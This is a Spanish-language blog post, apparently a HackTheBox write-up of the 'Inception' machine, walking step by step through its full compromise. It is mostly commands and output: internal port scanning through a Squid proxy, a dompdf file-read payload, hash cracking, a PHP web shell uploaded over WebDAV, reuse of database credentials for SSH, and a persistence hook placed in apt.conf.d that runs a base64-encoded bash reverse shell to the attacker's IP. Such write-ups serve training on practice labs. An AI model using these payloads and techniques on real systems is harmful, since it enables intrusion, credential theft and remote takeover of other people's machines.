---
date: 2023-05-03 12:00:00
layout: post
title: Inception Writeup
subtitle: Writeup de la máquina Inception de la plataforma HackTheBox
description: Realizaré la máquina Inception explicando el procedimiento para lograr pwnearla. Esta máquina tiene una dificultad Media.
image: https://drp1ngblog.es/wp-content/uploads/2022/03/inception00.png
optimized_image: https://drp1ngblog.es/wp-content/uploads/2022/03/inception00.png
category: Writeup
tags:
  - HackTheBox
  - Writeup
  - Linux
  - Medium
author: FredBrave
---
# Enumeracion
Empezamos con dos escaneos de nmap uno rapido para conseguir los puertos abiertos en la maquina y otro mas exhaustivo para encontrar versiones y los servicios que corren en dichos puertos abiertos.
```bash
sudo nmap -p- --open -sS --min-rate 2000 -n -Pn 10.129.192.85 -oG Targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 11:46 EDT
Nmap scan report for 10.129.192.85
Host is up (0.17s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
3128/tcp open  squid-http

Nmap done: 1 IP address (1 host up) scanned in 65.88 seconds



sudo nmap -p80,3128 -sCV 10.129.192.85 -oN Target
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 11:54 EDT
Nmap scan report for 10.129.192.85
Host is up (0.20s latency).

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.11 seconds
```
Una vez encontrada esta informacion proseguimos a enumerar los dos servicios.
<img class="img" src="/assets/img/machines/Inception/1.png" width="800">
El puerto 80 nos muestra solo una bandeja en donde podemos depositar un email, hice esto pero no ocurrio nada solo tomaba el email.
<img class='img' src='/assets/img/machines/Inception/2.png' width='800'>
El 3128 no nos mostraba gran cosa. Investigando <a href='https://www.ionos.es/digitalguide/servidores/configuracion/squid-el-servidor-proxy-cache-de-codigo-abierto/'>Squid</a> encontre que es un proxy que hace de intermediario entre el servidor web y los usuarios. Al tratar de encontrar formas de enumerar este proxy me encontre con un articulo de <a href='https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid'>HackTricks</a> muy interesante. En este encontre que si agrego la ip y el puerto en donde trabaja el proxy al archivo /etc/proxychains.conf puedo intentar escanear puertos internos en la maquina haciendo uso de un tunel creado por el proxy. Lo intente de esa forma pero no conseguia que funcionara buscando un poco mas encontre otra forma interesante y facil de hacer.
```bash
wfuzz -u http://127.0.0.1:FUZZ -z range,75-85 -p 10.129.192.85:3128:HTTP
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://127.0.0.1:FUZZ/
Total requests: 11

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                      
=====================================================================

000000001:   503        146 L    399 W      3638 Ch     "75"                                                                                                                                                                         
000000007:   503        146 L    399 W      3638 Ch     "81"                                                                                                                                                                         
000000006:   200        1051 L   169 W      2877 Ch     "80"                                                                                                                                                                         
000000003:   503        146 L    399 W      3638 Ch     "77"                                                                                                                                                                         
000000009:   503        146 L    399 W      3638 Ch     "83"                                                                                                                                                                         
000000010:   503        146 L    399 W      3638 Ch     "84"                                                                                                                                                                         
000000008:   503        146 L    399 W      3638 Ch     "82"                                                                                                                                                                         
000000004:   503        146 L    399 W      3638 Ch     "78"                                                                                                                                                                         
000000002:   503        146 L    399 W      3638 Ch     "76"                                                                                                                                                                         
000000011:   503        146 L    399 W      3638 Ch     "85"                                                                                                                                                                         
000000005:   503        146 L    399 W      3638 Ch     "79"                                                                                                                                                                         

Total time: 0.878384
Processed Requests: 11
Filtered Requests: 0
Requests/sec.: 12.52298
```
De esta forma podemos enumerar los puertos abiertos dentro de la maquina sin necesidad de tanto trabajo. Al revisar los resultados podemos ver que el 80 es diferente a los demas ya sea por caracteres, palabras y lineas. Por lo que podemos suponer que este puerto es el abierto, ahora intentaremos escanear otros puertos mas y filtrar los innecesarios.
```bash
wfuzz -u http://127.0.0.1:FUZZ -z range,1-1000 -p 10.129.192.85:3128:HTTP --hw 399
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://127.0.0.1:FUZZ/
Total requests: 1000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                      
=====================================================================

000000022:   200        2 L      4 W        60 Ch       "22"                                                                                                                                                                         
000000080:   200        1051 L   169 W      2877 Ch     "80"                                                                                                                                                                         

Total time: 21.75850
Processed Requests: 1000
Filtered Requests: 998
Requests/sec.: 45.95904
```
En los primeros mil puertos solo encontramos abiertos el 22 y 80.
# Ejecucion de comandos como www-data en el contenedor
Inpeccionando mejor la web en el puerto 80 me encuentro con el siguiente comentario.
<img class="img" src="/assets/img/machines/Inception/3.png" width="800">
Al parecer un dompdf esta trabajando por detras en la maquina, sabiendo esto trato de encontrar vulnerabilidades de este.
```bash
searchsploit dompdf
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read                                                                                                                                                        | php/webapps/33004.txt
dompdf 0.6.0 beta1 - Remote File Inclusion                                                                                                                                                                  | php/webapps/14851.txt
TYPO3 Extension ke DomPDF - Remote Code Execution                                                                                                                                                           | php/webapps/35443.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Entre las posibles vulnerabilidades encontre que el Arbitrary File Read funcionaba.
http://inception.htb/dompdf/dompdf.php?input\_file=php://filter/read=convert.base64-enconde/resource=/etc/passwd
<img class="img" src="/assets/img/machines/Inception/4.png" width="800">
Con esto logramos sacar al usuario cobb.
De aqui intente sacar muchas cosas pero no funcionaron, inclusive la configuracion del Squid, pero no encontre nada interesante, por lo tanto solo pude buscar la configuracion del servidor web.
http://inception.htb/dompdf/dompdf.php?input\_file=php://filter/read=convert.base64-enconde/resource=/etc/apache2/sites-enabled/000-default.conf
<img class="img" src="/assets/img/machines/Inception/5.png" width="800">
De esto porfin saque cosas interesantes.
http://inception.htb/dompdf/dompdf.php?input\_file=php://filter/read=convert.base64-enconde/resource=//var/www/html/webdav\_test\_inception/webdav.passwd
```bash
webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
```
En este archivo hay un hash el cual voy a tratar de crackear.
```bash
ohn -w=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
babygurl69       (webdav_tester)     
1g 0:00:00:00 DONE (2023-05-05 13:29) 10.00g/s 226560p/s 226560c/s 226560C/s mario12..ilovetodd
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Con esto hemos obtenido una clave.
Ahora intentare enumerar la ruta que encontramos en el archivo 000-default.conf
http://10.129.192.85/webdav\_test\_inception
<img class="img" src="/assets/img/machines/Inception/6.png" width="1000">
Me pide un usuario y clave. Le daremos los que acabamos de encontrar webdav\_tester:babygurl69 funciona.
Pero sigue sin dejarme ver el contenido de la web.
<img class="img" src="/assets/img/machines/Inception/7.png" width="800">
Enumerando un poco mas encontre que puedo subir archivos a esta ruta.
```bash
davtest -url http://10.129.192.85/webdav_test_inception -auth webdav_tester:babygurl69 
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.129.192.85/webdav_test_inception
********************************************************
NOTE	Random string for this session: eOS0iq
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq
********************************************************
 Sending test files
PUT	jsp	SUCCEED:	http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.jsp
PUT	jhtml	SUCCEED:	http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.jhtml
PUT	pl	SUCCEED:	http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.pl
PUT	cgi	SUCCEED:	http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.cgi
PUT	cfm	SUCCEED:	http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.cfm
PUT	php	SUCCEED:	http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.php
PUT	shtml	SUCCEED:	http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.shtml
PUT	txt	SUCCEED:	http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.txt
PUT	aspx	SUCCEED:	http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.aspx
PUT	html	SUCCEED:	http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.html
PUT	asp	SUCCEED:	http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.asp
********************************************************
 Checking for test file execution
EXEC	jsp	FAIL
EXEC	jhtml	FAIL
EXEC	pl	FAIL
EXEC	cgi	FAIL
EXEC	cfm	FAIL
EXEC	php	SUCCEED:	http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.php
EXEC	php	FAIL
EXEC	shtml	FAIL
EXEC	txt	SUCCEED:	http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.txt
EXEC	txt	FAIL
EXEC	aspx	FAIL
EXEC	html	SUCCEED:	http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.html
EXEC	html	FAIL
EXEC	asp	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq
PUT File: http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.jsp
PUT File: http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.jhtml
PUT File: http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.pl
PUT File: http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.cgi
PUT File: http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.cfm
PUT File: http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.php
PUT File: http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.shtml
PUT File: http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.txt
PUT File: http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.aspx
PUT File: http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.html
PUT File: http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.asp
Executes: http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.php
Executes: http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.txt
Executes: http://10.129.192.85/webdav_test_inception/DavTestDir_eOS0iq/davtest_eOS0iq.html
```
Podemos ejecutar codigo php. Siendo asi trate de subir una web shell simple al servidor.
```bash
$ echo '<?php system($_GET['cmd']); ?>' > shell.php
$ curl -s -X PUT http://webdav_tester:babygurl69@10.129.192.85/webdav_test_inception/shells.php -d @shell.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav_test_inception/shell.php has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.129.192.85 Port 80</address>
</body></html>

$ curl http://webdav_tester:babygurl69@10.129.192.85/webdav_test_inception/shells.php\?cmd\=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Tenemos ejecucion remota de comandos.

# Shell como cobb
Una vez hecho todo esto encontramos que la ip es diferente de la ip de la maquian por lo que podemos suponer que estamos en un contenedor.
```bash
curl http://webdav_tester:babygurl69@10.129.192.85/webdav_test_inception/shells.php\?cmd\=ifconfig
eth0      Link encap:Ethernet  HWaddr 00:16:3e:28:53:63  
          inet addr:192.168.0.10  Bcast:192.168.0.255  Mask:255.255.255.0
          inet6 addr: fe80::216:3eff:fe28:5363/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:469790 errors:0 dropped:0 overruns:0 frame:0
          TX packets:466411 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:82038647 (82.0 MB)  TX bytes:234176817 (234.1 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:5883 errors:0 dropped:0 overruns:0 frame:0
          TX packets:5883 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:468657 (468.6 KB)  TX bytes:468657 (468.6 KB)
``` 
No logramos encontrar mucho como www-data, pero en la ruta /var/www/html podemos encontrar una ruta que no teniamos antes.
```bash
curl http://webdav_tester:babygurl69@10.129.192.85/webdav_test_inception/shells.php\?cmd\=ls%20-la%20/var/www/html 
total 8052
drwxr-xr-x 7 root     root        4096 Aug 10  2022 .
drwxr-xr-x 3 root     root        4096 Aug 10  2022 ..
-rw-r--r-- 1 root     root       17128 May  7  2017 LICENSE.txt
-rw-r--r-- 1 root     root        2307 May  7  2017 README.txt
drwxr-xr-x 6 root     root        4096 Aug 10  2022 assets
drwxrwxr-x 4 root     root        4096 Aug 10  2022 dompdf
drwxr-xr-x 2 root     root        4096 Aug 10  2022 images
-rw-r--r-- 1 root     root        2877 Nov  6  2017 index.html
-rw-r--r-- 1 root     root     8184961 Oct 31  2017 latest.tar.gz
drwxr-xr-x 3 www-data www-data    4096 May  5 19:59 webdav_test_inception
drwxr-xr-x 5 root     root        4096 Aug 10  2022 wordpress_4.8.3
```
Al parecer tenemos un wordpress en la maquina.
```bash
curl http://webdav_tester:babygurl69@10.129.192.85/webdav_test_inception/shells.php\?cmd\=cat%20/var/www/html/wordpress_4.8.3/wp-config.php
.
.
.
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'VwPddNh7xMZyDQoByQL4');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
.
.
.
```
Encontramos una posible clave de una base de datos. Trate de encontrar la base de datos entre los puertos activos, pero no lo logre.
```bash
curl http://webdav_tester:babygurl69@10.129.192.85/webdav_test_inception/shells.php\?cmd\=ss%20-nltp                                       
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN     0      128          *:22                       *:*                  
LISTEN     0      128         :::80                      :::*                  
LISTEN     0      128         :::22                      :::*                  
LISTEN     0      128         :::3128                    :::*
```
Antes habia comentado que podiamos lograr escanear los puertos con nmap haciendo uso de proxychains, pero no solo podemos hacer eso sino que tambien podemos lograr una conexion al puerto ssh a traves de este. Para esto solo agregamos al final del archivo /etc/proxychains.conf las lineas 'http IP PORT-PROXY'
<img class="img" src="/assets/img/machines/Inception/8.png" width="800">
Y ahora usaremos la clave de la base de datos con el usuario cobb para conectarnos al ssh.
```bash
proxychains -q ssh cobb@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:U0SGU+GVWTOFT70ijo+5sR0ic98xILeRExQn+xTYLyg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
cobb@127.0.0.1's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Nov 30 20:06:16 2017 from 127.0.0.1
cobb@Inception:~$
```
Y somos el usuario cobb.
# Shell como root en el contenedor
Podemos ejecutar comandos como cualquier usuario.
```bash
cobb@Inception:~$ sudo -l
[sudo] password for cobb: 
Matching Defaults entries for cobb on Inception:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobb may run the following commands on Inception:
    (ALL : ALL) ALL
cobb@Inception:~$ sudo -i
root@Inception:~# whoami
root
root@Inception:~#
```
# Shell como root en la maquina real
## Enumeracion de red
Hacemos un Script one liner rapido y sencillo con ping para enumerar otros dispositivos conectados a la red.
```bash
root@Inception:~# for num in {1..254}; do (ping -c 1 192.168.0.${num} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 192.168.0.1: icmp_seq=1 ttl=64 time=0.082 ms
64 bytes from 192.168.0.10: icmp_seq=1 ttl=64 time=0.030 ms
```
Encontramos el equipo 192.168.0.1, ahora trataremos de encontrar los puertos.
```bash
root@Inception:~# nc -zv 192.168.0.1 1-65535 2>&1 | grep -v refused
Connection to 192.168.0.1 21 port [tcp/ftp] succeeded!
Connection to 192.168.0.1 22 port [tcp/ssh] succeeded!
Connection to 192.168.0.1 53 port [tcp/domain] succeeded!
```
Como tenemos el puerto ftp abierto algo que antes en el primer escaneo de map no teniamos, intentare entrar en este como anonymous.
```bash
root@Inception:/home/cobb# ftp 192.168.0.1
Connected to 192.168.0.1.
220 (vsFTPd 3.0.3)
Name (192.168.0.1:cobb): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 10  2022 bin
drwxr-xr-x    3 0        0            4096 Aug 10  2022 boot
drwxr-xr-x   18 0        0            3780 May 05 15:41 dev
drwxr-xr-x   93 0        0            4096 Aug 10  2022 etc
drwxr-xr-x    3 0        0            4096 Aug 10  2022 home
lrwxrwxrwx    1 0        0              33 Nov 30  2017 initrd.img -> boot/initrd.img-4.4.0-101-generic
drwxr-xr-x   22 0        0            4096 Aug 10  2022 lib
drwxr-xr-x    2 0        0            4096 Aug 10  2022 lib64
drwx------    2 0        0           16384 Oct 30  2017 lost+found
drwxr-xr-x    3 0        0            4096 Oct 30  2017 media
drwxr-xr-x    2 0        0            4096 Aug 10  2022 mnt
drwxr-xr-x    2 0        0            4096 Aug 01  2017 opt
dr-xr-xr-x  198 0        0               0 May 05 15:41 proc
drwx------    6 0        0            4096 May 05 15:42 root
drwxr-xr-x   26 0        0             920 May 05 15:41 run
drwxr-xr-x    2 0        0           12288 Nov 30  2017 sbin
drwxr-xr-x    2 0        0            4096 Aug 10  2022 snap
drwxr-xr-x    3 0        0            4096 Aug 10  2022 srv
dr-xr-xr-x   13 0        0               0 May 05 15:41 sys
drwxrwxrwt   10 0        0            4096 May 05 20:46 tmp
drwxr-xr-x   10 0        0            4096 Aug 10  2022 usr
drwxr-xr-x   13 0        0            4096 Aug 10  2022 var
lrwxrwxrwx    1 0        0              30 Nov 30  2017 vmlinuz -> boot/vmlinuz-4.4.0-101-generic
226 Directory send OK.
ftp>
```
Buscando encontre un cron job que que se ejecuta cada cinco minutos que podria servirme.
```bash
ftp> get crontab
local: crontab remote: crontab
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for crontab (826 bytes).
226 Transfer complete.
826 bytes received in 0.00 secs (2.0514 MB/s)
ftp> exit
221 Goodbye.
root@Inception:/home/cobb# cat crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *	* * *	root	apt update 2>&1 >/var/log/apt/custom.log
30 23	* * *	root	apt upgrade -y 2>&1 >/dev/null
root@Inception:/home/cobb#
```
Un apt update, mi primer pensamiento fue hacer un Path Hijacking, pero al segundo me di cuenta que seria imposible.
Como no encontre mucho mas y no tenia permisos para subir nada, pero si para ver casi todo intente encontrar una lista de posibles servicios en /etc/init.d
```bash
ftp> cd /etc/init.d
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2427 Jan 19  2016 README
-rwxr-xr-x    1 0        0            2243 Feb 09  2016 acpid
-rwxr-xr-x    1 0        0            6223 Mar 03  2017 apparmor
-rwxr-xr-x    1 0        0            2802 Nov 17  2017 apport
-rwxr-xr-x    1 0        0            1071 Dec 06  2015 atd
-rwxr-xr-x    1 0        0            1275 Jan 19  2016 bootmisc.sh
-rwxr-xr-x    1 0        0            3807 Jan 19  2016 checkfs.sh
-rwxr-xr-x    1 0        0            1098 Jan 19  2016 checkroot-bootclean.sh
-rwxr-xr-x    1 0        0            9353 Jan 19  2016 checkroot.sh
-rwxr-xr-x    1 0        0            1343 Apr 04  2016 console-setup
-rwxr-xr-x    1 0        0            3049 Apr 05  2016 cron
-rwxr-xr-x    1 0        0             937 Mar 28  2015 cryptdisks
-rwxr-xr-x    1 0        0             896 Mar 28  2015 cryptdisks-early
-rwxr-xr-x    1 0        0            2813 Dec 02  2015 dbus
-rwxr-xr-x    1 0        0            1105 Mar 15  2016 grub-common
-rwxr-xr-x    1 0        0            1336 Jan 19  2016 halt
-rwxr-xr-x    1 0        0            1423 Jan 19  2016 hostname.sh
-rwxr-xr-x    1 0        0            3809 Mar 12  2016 hwclock.sh
-rwxr-xr-x    1 0        0            2372 Apr 11  2016 irqbalance
-rwxr-xr-x    1 0        0            1503 Mar 29  2016 iscsid
-rwxr-xr-x    1 0        0            1804 Apr 04  2016 keyboard-setup
-rwxr-xr-x    1 0        0            1300 Jan 19  2016 killprocs
-rwxr-xr-x    1 0        0            2087 Dec 20  2015 kmod
-rwxr-xr-x    1 0        0             695 Oct 30  2015 lvm2
-rwxr-xr-x    1 0        0             571 Oct 30  2015 lvm2-lvmetad
-rwxr-xr-x    1 0        0             586 Oct 30  2015 lvm2-lvmpolld
-rwxr-xr-x    1 0        0            2378 Nov 09  2017 lxcfs
-rwxr-xr-x    1 0        0            2541 Jun 08  2017 lxd
-rwxr-xr-x    1 0        0            2365 Oct 09  2017 mdadm
-rwxr-xr-x    1 0        0            1199 Jul 16  2014 mdadm-waitidle
-rwxr-xr-x    1 0        0             703 Jan 19  2016 mountall-bootclean.sh
-rwxr-xr-x    1 0        0            2301 Jan 19  2016 mountall.sh
-rwxr-xr-x    1 0        0            1461 Jan 19  2016 mountdevsubfs.sh
-rwxr-xr-x    1 0        0            1564 Jan 19  2016 mountkernfs.sh
-rwxr-xr-x    1 0        0             711 Jan 19  2016 mountnfs-bootclean.sh
-rwxr-xr-x    1 0        0            2456 Jan 19  2016 mountnfs.sh
-rwxr-xr-x    1 0        0            4771 Jul 19  2015 networking
-rwxr-xr-x    1 0        0            1581 Oct 16  2015 ondemand
-rwxr-xr-x    1 0        0            2503 Mar 29  2016 open-iscsi
-rwxr-xr-x    1 0        0            1578 Sep 18  2016 open-vm-tools
-rwxr-xr-x    1 0        0            1366 Nov 15  2015 plymouth
-rwxr-xr-x    1 0        0             752 Nov 15  2015 plymouth-log
-rwxr-xr-x    1 0        0            1192 Sep 06  2015 procps
-rwxr-xr-x    1 0        0            6366 Jan 19  2016 rc
-rwxr-xr-x    1 0        0             820 Jan 19  2016 rc.local
-rwxr-xr-x    1 0        0             117 Jan 19  2016 rcS
-rwxr-xr-x    1 0        0             661 Jan 19  2016 reboot
-rwxr-xr-x    1 0        0            4149 Nov 23  2015 resolvconf
-rwxr-xr-x    1 0        0            4355 Jul 10  2014 rsync
-rwxr-xr-x    1 0        0            2796 Feb 03  2016 rsyslog
-rwxr-xr-x    1 0        0            1226 Jun 09  2015 screen-cleanup
-rwxr-xr-x    1 0        0            3927 Jan 19  2016 sendsigs
-rwxr-xr-x    1 0        0             597 Jan 19  2016 single
-rw-r--r--    1 0        0            1087 Jan 19  2016 skeleton
-rwxr-xr-x    1 0        0            4077 Mar 16  2017 ssh
-rwxr-xr-x    1 0        0            2070 Mar 24  2017 tftpd-hpa
-rwxr-xr-x    1 0        0            6087 Apr 12  2016 udev
-rwxr-xr-x    1 0        0            2049 Aug 07  2014 ufw
-rwxr-xr-x    1 0        0            2737 Jan 19  2016 umountfs
-rwxr-xr-x    1 0        0            2202 Jan 19  2016 umountnfs.sh
-rwxr-xr-x    1 0        0            1879 Jan 19  2016 umountroot
-rwxr-xr-x    1 0        0            3111 Jan 19  2016 urandom
-rwxr-xr-x    1 0        0            1306 Jun 14  2017 uuidd
-rwxr-xr-x    1 0        0            2031 Feb 10  2016 vsftpd
-rwxr-xr-x    1 0        0            2757 Nov 10  2015 x11-common
-rwxr-xr-x    1 0        0            2443 Oct 26  2013 xinetd
226 Directory send OK.
ftp>
```
En este podemos ver el tftpd por lo tanto intento escanear los puertos udp.
```bash
root@Inception:/home/cobb# nc -uzv 192.168.0.1 1-65535 2>&1 | grep -v refused
Connection to 192.168.0.1 53 port [udp/domain] succeeded!
Connection to 192.168.0.1 67 port [udp/bootps] succeeded!
Connection to 192.168.0.1 68 port [udp/bootpc] succeeded!
Connection to 192.168.0.1 69 port [udp/tftp] succeeded!
```
Al encontrar el puerto 69 tftp abierto inteno conectarme a este.
```bash
root@Inception:/home/cobb# tftp 192.168.0.1
tftp> ls
?Invalid command
```
Pareciera que no puedo hacer nada pero al intentar cargar un archivo pude.
```bash
root@Inception:/tmp# echo 'hola' > test.txt
root@Inception:/tmp# ls
test.txt
root@Inception:/tmp# tftp 192.168.0.1
tftp> put test.txt /tmp/test.txt
Sent 6 bytes in 0.0 seconds
tftp>

ftp> ls /tmp
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwt    2 0        0            4096 May 05 15:41 VMwareDnD
drwx------    3 0        0            4096 May 05 15:41 systemd-private-c0fa0db3551f468ea6d53e90956fb656-systemd-timesyncd.service-rm2hXp
-rw-rw-rw-    1 0        0               5 May 05 21:05 test.txt
drwx------    2 0        0            4096 May 05 15:42 vmware-root
226 Directory send OK.
```
Al tratar de encontrar formas de aprovechar esto sabiendo que la tarea cron es importante me encontre un <a href='https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/'>articulo</a> en el cual explican cosas interesantes.
Asi que cree un archivo llamado reverse con el siguiente contenido
APT::Update::Pre-Invoke {"echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40Mi80MzMgMD4mMScK | base64 -d | bash";};
Primero encodee todo a base64 y luego con un echo coloque todo en un archivo.
```bash
echo "bash -c 'bash -i >& /dev/tcp/10.10.16.42/443 0>&1'" | base64
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40Mi80MzMgMD4mMScK
root@Inception:/tmp# echo 'APT::Update::Pre-Invoke {"echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40Mi80MzMgMD4mMScK | base64 -d | bash";};' > reverse
root@Inception:/tmp# cat reverse
APT::Update::Pre-Invoke {"echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40Mi80MzMgMD4mMScK | base64 -d | bash";};

root@Inception:/tmp# tftp 192.168.0.1
tftp> put reverse /etc/apt/apt.conf.d/reverse
Sent 124 bytes in 0.0 seconds
tftp>
```
Lo subi y deberia de llegarme en unos minutos una reverse shell.
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.42] from (UNKNOWN) [10.129.192.85] 60116
bash: cannot set terminal process group (5876): Inappropriate ioctl for device
bash: no job control in this shell
root@Inception:/tmp# whoami
whoami
root
```
Hemos pwneado la maquina!!
